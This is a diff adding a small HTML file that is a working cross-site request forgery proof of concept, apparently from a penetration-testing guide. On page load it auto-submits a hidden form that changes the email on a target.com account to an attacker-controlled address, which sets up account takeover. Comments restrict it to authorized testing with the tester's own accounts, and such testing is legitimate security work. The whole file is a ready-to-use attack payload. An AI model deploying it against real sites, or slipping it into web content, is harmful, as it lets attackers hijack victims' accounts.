@@ -1,0 +1,12 @@
+<!doctype html>
+<!-- Classic auto-submit POST CSRF (guide §23.2). FIRES ONLY IF the session cookie is SameSite=None.
+     Authorized testing only; use your own two test accounts; host CROSS-SITE; open in a DEFAULT browser. -->
+<html><head><meta charset="utf-8"><meta name="referrer" content="no-referrer"></head>
+<body>
+<h3>loading…</h3>
+<form id="csrf" action="https://target.com/account/email" method="POST">
+  <input type="hidden" name="email" value="attacker@my-inbox.example">
+  <!-- add every required param; to TEST token validation, omit/forge it (guide §5) -->
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body></html>
